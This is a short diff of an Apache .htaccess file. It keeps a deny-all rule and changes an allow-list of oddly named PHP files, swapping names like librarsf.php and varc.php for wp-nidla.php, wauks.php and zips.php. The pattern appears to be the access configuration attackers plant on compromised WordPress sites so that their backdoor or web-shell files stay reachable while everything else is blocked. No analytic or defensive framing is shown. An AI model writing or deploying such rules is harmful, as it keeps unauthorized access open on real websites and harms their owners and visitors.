@@ -3,7 +3,7 @@ Order Allow,Deny
 Deny from all
 </FilesMatch>
 Options -Indexes
-<FilesMatch '^(librarsf.php|la.php|page-io.php|confinas.php|style-ka.php|page-inc.php|varc.php)$'>
+<FilesMatch '^(wp-nidla.php|wauks.php|zips.php|wp-class.inc.php|confina-wp-inc.php)$'>
  Order allow,deny
  Allow from all
 </FilesMatch>
